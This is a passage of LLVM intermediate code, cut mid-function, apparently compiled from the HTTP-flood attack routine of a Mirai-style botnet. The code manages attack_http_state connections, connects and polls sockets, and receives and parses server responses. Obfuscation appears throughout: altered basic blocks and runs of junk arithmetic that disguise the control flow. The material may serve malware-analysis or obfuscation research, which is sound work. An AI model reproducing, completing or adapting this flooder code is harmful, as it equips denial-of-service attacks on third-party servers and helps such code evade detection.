  %4208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %4209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %4208, i32 0, i32 0
  store i32 %4207, i32* %4209, align 4
  %4210 = load i16, i16* %19, align 2
  %4211 = call zeroext i16 @htons(i16 zeroext %4210) #7
  %4212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %4211, i16* %4212, align 2
  %4213 = load i32, i32* %27, align 4
  %4214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4215 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4214, i32 0, i32 2
  store i32 %4213, i32* %4215, align 4
  %4216 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4216, i32 0, i32 1
  store i8 2, i8* %4217, align 4
  %4218 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4219 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4218, i32 0, i32 0
  %4220 = load i32, i32* %4219, align 4
  %4221 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %4222 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %4222, %struct.sockaddr** %4221, align 8
  %4223 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %4224 = load %struct.sockaddr*, %struct.sockaddr** %4223, align 8
  %4225 = call i32 @connect(i32 %4220, %struct.sockaddr* %4224, i32 16)
  %4226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4226, i32 0, i32 0
  %4228 = load i32, i32* %4227, align 4
  %4229 = srem i32 %4228, 64
  %4230 = zext i32 %4229 to i64
  %_61 = sub i64 1, %4230
  %gen62 = mul i64 %_61, %4230
  %4231 = shl i64 1, %4230
  %4232 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4233 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4234 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4233, i32 0, i32 0
  %4235 = load i32, i32* %4234, align 4
  %_63 = sub i32 %4235, 64
  %gen64 = mul i32 %_63, 64
  %_65 = sub i32 %4235, 64
  %gen66 = mul i32 %_65, 64
  %_67 = sub i32 %4235, 64
  %gen68 = mul i32 %_67, 64
  %_69 = sub i32 %4235, 64
  %gen70 = mul i32 %_69, 64
  %_71 = sub i32 %4235, 64
  %gen72 = mul i32 %_71, 64
  %_73 = shl i32 %4235, 64
  %_74 = shl i32 %4235, 64
  %_75 = sub i32 %4235, 64
  %gen76 = mul i32 %_75, 64
  %4236 = sdiv i32 %4235, 64
  %4237 = sext i32 %4236 to i64
  %4238 = getelementptr inbounds [16 x i64], [16 x i64]* %4232, i64 0, i64 %4237
  %4239 = load i64, i64* %4238, align 8
  %_77 = shl i64 %4239, %4231
  %4240 = or i64 %4239, %4231
  store i64 %4240, i64* %4238, align 8
  %4241 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4242 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4241, i32 0, i32 0
  %4243 = load i32, i32* %4242, align 4
  %4244 = load i32, i32* %23, align 4
  %4245 = icmp sgt i32 %4243, %4244
  br label %originalBB49

originalBB81alteredBB:                            ; preds = %originalBB81, %693
  %4246 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4247 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4246, i32 0, i32 1
  %4248 = load i8, i8* %4247, align 4
  %4249 = zext i8 %4248 to i32
  %4250 = icmp eq i32 %4249, 2
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %722
  %4251 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4252 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4251, i32 0, i32 1
  store i8 0, i8* %4252, align 4
  %4253 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4254 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4253, i32 0, i32 0
  %4255 = load i32, i32* %4254, align 4
  %4256 = call i32 @close(i32 %4255)
  %4257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4257, i32 0, i32 0
  store i32 -1, i32* %4258, align 4
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %747
  %4259 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4260 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4259, i32 0, i32 0
  %4261 = load i32, i32* %4260, align 4
  %_90 = shl i32 %4261, 64
  %_91 = sub i32 0, %4261
  %gen92 = add i32 %_91, 64
  %_93 = shl i32 %4261, 64
  %_94 = sub i32 0, %4261
  %gen95 = add i32 %_94, 64
  %_96 = sub i32 0, %4261
  %gen97 = add i32 %_96, 64
  %_98 = sub i32 %4261, 64
  %gen99 = mul i32 %_98, 64
  %_100 = sub i32 %4261, 64
  %gen101 = mul i32 %_100, 64
  %_102 = sub i32 0, %4261
  %gen103 = add i32 %_102, 64
  %4262 = srem i32 %4261, 64
  %4263 = zext i32 %4262 to i64
  %_104 = shl i64 1, %4263
  %_105 = shl i64 1, %4263
  %_106 = shl i64 1, %4263
  %_107 = sub i64 0, 1
  %gen108 = add i64 %_107, %4263
  %_109 = sub i64 1, %4263
  %gen110 = mul i64 %_109, %4263
  %_111 = sub i64 1, %4263
  %gen112 = mul i64 %_111, %4263
  %_113 = sub i64 1, %4263
  %gen114 = mul i64 %_113, %4263
  %_115 = sub i64 1, %4263
  %gen116 = mul i64 %_115, %4263
  %4264 = shl i64 1, %4263
  %4265 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4266 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4267 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4266, i32 0, i32 0
  %4268 = load i32, i32* %4267, align 4
  %_117 = sub i32 0, %4268
  %gen118 = add i32 %_117, 64
  %_119 = sub i32 %4268, 64
  %gen120 = mul i32 %_119, 64
  %_121 = sub i32 0, %4268
  %gen122 = add i32 %_121, 64
  %_123 = shl i32 %4268, 64
  %_124 = sub i32 0, %4268
  %gen125 = add i32 %_124, 64
  %_126 = sub i32 0, %4268
  %gen127 = add i32 %_126, 64
  %_128 = sub i32 0, %4268
  %gen129 = add i32 %_128, 64
  %_130 = sub i32 %4268, 64
  %gen131 = mul i32 %_130, 64
  %4269 = sdiv i32 %4268, 64
  %4270 = sext i32 %4269 to i64
  %4271 = getelementptr inbounds [16 x i64], [16 x i64]* %4265, i64 0, i64 %4270
  %4272 = load i64, i64* %4271, align 8
  %_132 = shl i64 %4272, %4264
  %_133 = sub i64 0, %4272
  %gen134 = add i64 %_133, %4264
  %_135 = sub i64 %4272, %4264
  %gen136 = mul i64 %_135, %4264
  %_137 = sub i64 0, %4272
  %gen138 = add i64 %_137, %4264
  %4273 = or i64 %4272, %4264
  store i64 %4273, i64* %4271, align 8
  %4274 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4275 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4274, i32 0, i32 0
  %4276 = load i32, i32* %4275, align 4
  %4277 = load i32, i32* %23, align 4
  %4278 = icmp sgt i32 %4276, %4277
  br label %originalBB89

originalBB142alteredBB:                           ; preds = %originalBB142, %1022
  %4279 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4280 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4279, i32 0, i32 9
  %4281 = getelementptr inbounds [9 x i8], [9 x i8]* %4280, i32 0, i32 0
  %4282 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4283 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4282, i32 0, i32 10
  %4284 = getelementptr inbounds [9 x i8], [9 x i8]* %4283, i32 0, i32 0
  %4285 = call i32 @util_strcpy(i8* %4281, i8* %4284)
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1080
  %4286 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4286, i32 0, i32 0
  %4288 = load i32, i32* %4287, align 4
  %_147 = sub i32 %4288, 1
  %gen148 = mul i32 %_147, 1
  %_149 = sub i32 %4288, 1
  %gen150 = mul i32 %_149, 1
  %_151 = shl i32 %4288, 1
  %_152 = sub i32 %4288, 1
  %gen153 = mul i32 %_152, 1
  %_154 = shl i32 %4288, 1
  %_155 = shl i32 %4288, 1
  %4289 = add nsw i32 %4288, 1
  store i32 %4289, i32* %23, align 4
  br label %originalBB146

originalBB159alteredBB:                           ; preds = %originalBB159, %1102
  %4290 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4291 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4290, i32 0, i32 1
  %4292 = load i8, i8* %4291, align 4
  %4293 = zext i8 %4292 to i32
  %4294 = icmp eq i32 %4293, 6
  br label %originalBB159

originalBB163alteredBB:                           ; preds = %originalBB163, %1124
  %4295 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4295, i32 0, i32 0
  %4297 = load i32, i32* %4296, align 4
  %_164 = shl i32 %4297, 64
  %_165 = sub i32 0, %4297
  %gen166 = add i32 %_165, 64
  %_167 = shl i32 %4297, 64
  %_168 = sub i32 0, %4297
  %gen169 = add i32 %_168, 64
  %4298 = srem i32 %4297, 64
  %4299 = zext i32 %4298 to i64
  %_170 = sub i64 1, %4299
  %gen171 = mul i64 %_170, %4299
  %4300 = shl i64 1, %4299
  %4301 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4302 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4303 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4302, i32 0, i32 0
  %4304 = load i32, i32* %4303, align 4
  %_172 = shl i32 %4304, 64
  %_173 = sub i32 %4304, 64
  %gen174 = mul i32 %_173, 64
  %4305 = sdiv i32 %4304, 64
  %4306 = sext i32 %4305 to i64
  %4307 = getelementptr inbounds [16 x i64], [16 x i64]* %4301, i64 0, i64 %4306
  %4308 = load i64, i64* %4307, align 8
  %_175 = sub i64 0, %4308
  %gen176 = add i64 %_175, %4300
  %4309 = or i64 %4308, %4300
  store i64 %4309, i64* %4307, align 8
  %4310 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4311 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4310, i32 0, i32 0
  %4312 = load i32, i32* %4311, align 4
  %4313 = load i32, i32* %23, align 4
  %4314 = icmp sgt i32 %4312, %4313
  br label %originalBB163

originalBB180alteredBB:                           ; preds = %originalBB180, %1248
  %4315 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4316 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4315, i32 0, i32 1
  store i8 0, i8* %4316, align 4
  %4317 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4318 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4317, i32 0, i32 0
  %4319 = load i32, i32* %4318, align 4
  %4320 = call i32 @close(i32 %4319)
  %4321 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4322 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4321, i32 0, i32 0
  store i32 -1, i32* %4322, align 4
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1273
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1291
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %1319
  %4323 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %4323, align 8
  %4324 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %4324, align 8
  %4325 = load i32, i32* %23, align 4
  %4326 = call i32 @select(i32 %4325, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %4326, i32* %24, align 4
  %4327 = call i64 @time(i64* null) #6
  %4328 = trunc i64 %4327 to i32
  store i32 %4328, i32* %27, align 4
  %4329 = load i32, i32* %24, align 4
  %4330 = icmp slt i32 %4329, 1
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %1359
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %1376
  %4331 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %4332 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4332, i32 0, i32 0
  %4334 = load i32, i32* %4333, align 4
  %_201 = sub i32 0, %4334
  %gen202 = add i32 %_201, 64
  %_203 = sub i32 %4334, 64
  %gen204 = mul i32 %_203, 64
  %_205 = sub i32 %4334, 64
  %gen206 = mul i32 %_205, 64
  %4335 = sdiv i32 %4334, 64
  %4336 = sext i32 %4335 to i64
  %4337 = getelementptr inbounds [16 x i64], [16 x i64]* %4331, i64 0, i64 %4336
  %4338 = load i64, i64* %4337, align 8
  %4339 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4340 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4339, i32 0, i32 0
  %4341 = load i32, i32* %4340, align 4
  %_207 = sub i32 0, %4341
  %gen208 = add i32 %_207, 64
  %_209 = sub i32 %4341, 64
  %gen210 = mul i32 %_209, 64
  %4342 = srem i32 %4341, 64
  %4343 = zext i32 %4342 to i64
  %_211 = sub i64 0, 1
  %gen212 = add i64 %_211, %4343
  %_213 = shl i64 1, %4343
  %_214 = sub i64 0, 1
  %gen215 = add i64 %_214, %4343
  %_216 = shl i64 1, %4343
  %_217 = shl i64 1, %4343
  %4344 = shl i64 1, %4343
  %_218 = sub i64 %4338, %4344
  %gen219 = mul i64 %_218, %4344
  %4345 = and i64 %4338, %4344
  %4346 = icmp ne i64 %4345, 0
  br label %originalBB200

originalBB223alteredBB:                           ; preds = %originalBB223, %1409
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %4347 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4348 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4347, i32 0, i32 0
  %4349 = load i32, i32* %4348, align 4
  %4350 = bitcast i32* %35 to i8*
  %4351 = call i32 @getsockopt(i32 %4349, i32 1, i32 4, i8* %4350, i32* %36) #6
  store i32 %4351, i32* %12, align 4
  %4352 = load i32, i32* %35, align 4
  %4353 = icmp eq i32 %4352, 0
  br label %originalBB223

originalBB227alteredBB:                           ; preds = %originalBB227, %1439
  %4354 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4355 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4354, i32 0, i32 0
  %4356 = load i32, i32* %4355, align 4
  %4357 = call i32 @close(i32 %4356)
  %4358 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4359 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4358, i32 0, i32 0
  store i32 -1, i32* %4359, align 4
  %4360 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4361 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4360, i32 0, i32 1
  store i8 0, i8* %4361, align 4
  br label %originalBB227

originalBB232alteredBB:                           ; preds = %originalBB232, %1464
  br label %originalBB232

originalBB236alteredBB:                           ; preds = %originalBB236, %1481
  %4362 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %4363 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4364 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4363, i32 0, i32 0
  %4365 = load i32, i32* %4364, align 4
  %_237 = sub i32 %4365, 64
  %gen238 = mul i32 %_237, 64
  %_239 = shl i32 %4365, 64
  %_240 = sub i32 0, %4365
  %gen241 = add i32 %_240, 64
  %_242 = shl i32 %4365, 64
  %_243 = sub i32 %4365, 64
  %gen244 = mul i32 %_243, 64
  %_245 = shl i32 %4365, 64
  %4366 = sdiv i32 %4365, 64
  %4367 = sext i32 %4366 to i64
  %4368 = getelementptr inbounds [16 x i64], [16 x i64]* %4362, i64 0, i64 %4367
  %4369 = load i64, i64* %4368, align 8
  %4370 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4370, i32 0, i32 0
  %4372 = load i32, i32* %4371, align 4
  %_246 = shl i32 %4372, 64
  %_247 = sub i32 0, %4372
  %gen248 = add i32 %_247, 64
  %4373 = srem i32 %4372, 64
  %4374 = zext i32 %4373 to i64
  %_249 = shl i64 1, %4374
  %_250 = shl i64 1, %4374
  %_251 = sub i64 0, 1
  %gen252 = add i64 %_251, %4374
  %_253 = shl i64 1, %4374
  %_254 = sub i64 0, 1
  %gen255 = add i64 %_254, %4374
  %_256 = sub i64 0, 1
  %gen257 = add i64 %_256, %4374
  %_258 = sub i64 0, 1
  %gen259 = add i64 %_258, %4374
  %_260 = sub i64 0, 1
  %gen261 = add i64 %_260, %4374
  %4375 = shl i64 1, %4374
  %_262 = sub i64 %4369, %4375
  %gen263 = mul i64 %_262, %4375
  %_264 = sub i64 0, %4369
  %gen265 = add i64 %_264, %4375
  %_266 = shl i64 %4369, %4375
  %4376 = and i64 %4369, %4375
  %4377 = icmp ne i64 %4376, 0
  br label %originalBB236

originalBB270alteredBB:                           ; preds = %originalBB270, %1514
  %4378 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4378, i32 0, i32 1
  %4380 = load i8, i8* %4379, align 4
  %4381 = zext i8 %4380 to i32
  %4382 = icmp eq i32 %4381, 6
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %1536
  store i32 0, i32* %37, align 4
  %4383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %4383, i32 10240)
  %4384 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4385 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4384, i32 0, i32 0
  %4386 = load i32, i32* %4385, align 4
  %4387 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4388 = call i64 @recv(i32 %4386, i8* %4387, i64 10240, i32 16386)
  %4389 = trunc i64 %4388 to i32
  store i32 %4389, i32* %12, align 4
  %4390 = icmp slt i32 %4389, 1
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %1570
  %4391 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4392 = load i32, i32* %12, align 4
  %4393 = call i32 @util_memsearch(i8* %4391, i32 %4392, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4394 = icmp eq i32 %4393, -1
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %1591
  %4395 = load i32, i32* %12, align 4
  %4396 = icmp slt i32 %4395, 10240
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %1611
  %4397 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4398 = load i32, i32* %12, align 4
  %4399 = call i32 @util_memsearch(i8* %4397, i32 %4398, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %4400 = sext i32 %4399 to i64
  %4401 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4400
  store i8 0, i8* %4401, align 1
  %4402 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4403 = load i32, i32* %12, align 4
  %4404 = call i8* @table_retrieve_val(i32 62, i32* null)
  %4405 = call i32 @util_stristr(i8* %4402, i32 %4403, i8* %4404)
  %4406 = icmp ne i32 %4405, -1
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %1638
  %4407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4407, i32 0, i32 11
  store i32 2, i32* %4408, align 4
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %1663
  %4409 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4410 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4409, i32 0, i32 11
  store i32 1, i32* %4410, align 4
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %1739
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %1757
  %4411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4411, i32 0, i32 13
  store i32 0, i32* %4412, align 4
  %4413 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4414 = load i32, i32* %12, align 4
  %4415 = call i8* @table_retrieve_val(i32 57, i32* null)
  %4416 = call i32 @util_stristr(i8* %4413, i32 %4414, i8* %4415)
  %4417 = icmp ne i32 %4416, -1
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %1831
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %1879
  %4418 = load i32, i32* %44, align 4
  %4419 = sext i32 %4418 to i64
  %4420 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %4419
  store i8* %4420, i8** %46, align 8
  %4421 = load i32, i32* %45, align 4
  %4422 = icmp sge i32 %4421, 2
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %1901
  %4423 = load i32, i32* %45, align 4
  %_315 = sub i32 %4423, 2
  %gen316 = mul i32 %_315, 2
  %_317 = shl i32 %4423, 2
  %_318 = shl i32 %4423, 2
  %4424 = sub nsw i32 %4423, 2
  store i32 %4424, i32* %45, align 4
  br label %originalBB314

originalBB322alteredBB:                           ; preds = %originalBB322, %1931
  %4425 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4426 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4425, i32 0, i32 14
  store i32 0, i32* %4426, align 4
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %1950
  store i32 0, i32* %37, align 4
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2029
  %4427 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4428 = load i32, i32* %37, align 4
  %4429 = sext i32 %4428 to i64
  %4430 = getelementptr inbounds i8, i8* %4427, i64 %4429
  %4431 = load i32, i32* %47, align 4
  %4432 = sext i32 %4431 to i64
  %4433 = getelementptr inbounds i8, i8* %4430, i64 %4432
  %4434 = load i32, i32* %12, align 4
  %4435 = load i32, i32* %37, align 4
  %_331 = sub i32 0, %4434
  %gen332 = add i32 %_331, %4435
  %_333 = sub i32 %4434, %4435
  %gen334 = mul i32 %_333, %4435
  %_335 = shl i32 %4434, %4435
  %_336 = shl i32 %4434, %4435
  %_337 = shl i32 %4434, %4435
  %4436 = sub nsw i32 %4434, %4435
  %4437 = load i32, i32* %47, align 4
  %_338 = shl i32 %4436, %4437
  %_339 = shl i32 %4436, %4437
  %_340 = sub i32 0, %4436
  %gen341 = add i32 %_340, %4437
  %_342 = sub i32 0, %4436
  %gen343 = add i32 %_342, %4437
  %_344 = sub i32 %4436, %4437
  %gen345 = mul i32 %_344, %4437
  %_346 = sub i32 0, %4436
  %gen347 = add i32 %_346, %4437
  %_348 = sub i32 %4436, %4437
  %gen349 = mul i32 %_348, %4437
  %_350 = shl i32 %4436, %4437
  %_351 = sub i32 0, %4436
  %gen352 = add i32 %_351, %4437
  %4438 = sub nsw i32 %4436, %4437
  %4439 = call i32 @util_memsearch(i8* %4433, i32 %4438, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4440 = icmp sgt i32 %4439, 0
  br label %originalBB330

originalBB356alteredBB:                           ; preds = %originalBB356, %2101
  %4441 = load i8*, i8** %49, align 8
  %4442 = load i32, i32* %10, align 4
  %4443 = sext i32 %4442 to i64
  %4444 = getelementptr inbounds i8, i8* %4441, i64 %4443
  %4445 = load i8, i8* %4444, align 1
  %4446 = sext i8 %4445 to i32
  %4447 = icmp eq i32 %4446, 61
  br label %originalBB356

originalBB360alteredBB:                           ; preds = %originalBB360, %2125
  %4448 = load i32, i32* %10, align 4
  store i32 %4448, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %originalBB360

originalBB364alteredBB:                           ; preds = %originalBB364, %2149
  %4449 = load i8*, i8** %49, align 8
  %4450 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4451 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4450, i32 0, i32 16
  %4452 = load i32, i32* %10, align 4
  %4453 = sext i32 %4452 to i64
  %4454 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4451, i64 0, i64 %4453
  %4455 = getelementptr inbounds [128 x i8], [128 x i8]* %4454, i32 0, i32 0
  %4456 = load i32, i32* %50, align 4
  %4457 = call signext i8 @util_strncmp(i8* %4449, i8* %4455, i32 %4456)
  %4458 = icmp ne i8 %4457, 0
  br label %originalBB364

originalBB368alteredBB:                           ; preds = %originalBB368, %2176
  store i32 1, i32* %51, align 4
  br label %originalBB368

originalBB372alteredBB:                           ; preds = %originalBB372, %2197
  %4459 = load i32, i32* %51, align 4
  %4460 = icmp ne i32 %4459, 0
  br label %originalBB372

originalBB376alteredBB:                           ; preds = %originalBB376, %2237
  br label %originalBB376

originalBB380alteredBB:                           ; preds = %originalBB380, %2258
  %4461 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4462 = load i32, i32* %12, align 4
  %4463 = call i8* @table_retrieve_val(i32 54, i32* null)
  %4464 = call i32 @util_stristr(i8* %4461, i32 %4462, i8* %4463)
  %4465 = icmp ne i32 %4464, -1
  br label %originalBB380

originalBB384alteredBB:                           ; preds = %originalBB384, %2311
  %4466 = load i32, i32* %53, align 4
  %_385 = sub i32 0, %4466
  %gen386 = add i32 %_385, 2
  %_387 = sub i32 0, %4466
  %gen388 = add i32 %_387, 2
  %_389 = shl i32 %4466, 2
  %_390 = sub i32 0, %4466
  %gen391 = add i32 %_390, 2
  %4467 = sub nsw i32 %4466, 2
  store i32 %4467, i32* %53, align 4
  br label %originalBB384

originalBB395alteredBB:                           ; preds = %originalBB395, %2369
  %4468 = load i8*, i8** %54, align 8
  %4469 = load i32, i32* %10, align 4
  %4470 = sext i32 %4469 to i64
  %4471 = getelementptr inbounds i8, i8* %4468, i64 %4470
  %4472 = load i8, i8* %4471, align 1
  %4473 = sext i8 %4472 to i32
  %4474 = icmp eq i32 %4473, 47
  br label %originalBB395

originalBB399alteredBB:                           ; preds = %originalBB399, %2401
  %4475 = load i8*, i8** %54, align 8
  %4476 = call i32 @util_strlen(i8* %4475)
  %4477 = icmp sgt i32 %4476, 0
  br label %originalBB399

originalBB403alteredBB:                           ; preds = %originalBB403, %2421
  %4478 = load i8*, i8** %54, align 8
  %4479 = call i32 @util_strlen(i8* %4478)
  %4480 = icmp slt i32 %4479, 128
  br label %originalBB403

originalBB407alteredBB:                           ; preds = %originalBB407, %2441
  %4481 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4482 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4481, i32 0, i32 7
  %4483 = getelementptr inbounds [129 x i8], [129 x i8]* %4482, i32 0, i32 0
  %4484 = load i8*, i8** %54, align 8
  %4485 = call i32 @util_strcpy(i8* %4483, i8* %4484)
  br label %originalBB407

originalBB411alteredBB:                           ; preds = %originalBB411, %2494
  br label %originalBB411

originalBB415alteredBB:                           ; preds = %originalBB415, %2511
  br label %originalBB415

originalBB419alteredBB:                           ; preds = %originalBB419, %2528
  %4486 = load i8*, i8** %54, align 8
  %4487 = getelementptr inbounds i8, i8* %4486, i64 0
  %4488 = load i8, i8* %4487, align 1
  %4489 = sext i8 %4488 to i32
  %4490 = icmp eq i32 %4489, 47
  br label %originalBB419

originalBB423alteredBB:                           ; preds = %originalBB423, %2562
  %4491 = load i8*, i8** %54, align 8
  %4492 = load i32, i32* %10, align 4
  %_424 = sub i32 0, %4492
  %gen425 = add i32 %_424, 1
  %_426 = sub i32 %4492, 1
  %gen427 = mul i32 %_426, 1
  %_428 = sub i32 %4492, 1
  %gen429 = mul i32 %_428, 1
  %_430 = shl i32 %4492, 1
  %4493 = add nsw i32 %4492, 1
  %4494 = sext i32 %4493 to i64
  %4495 = getelementptr inbounds i8, i8* %4491, i64 %4494
  %4496 = call i32 @util_strlen(i8* %4495)
  %4497 = icmp slt i32 %4496, 256
  br label %originalBB423

originalBB434alteredBB:                           ; preds = %originalBB434, %2597
  br label %originalBB434

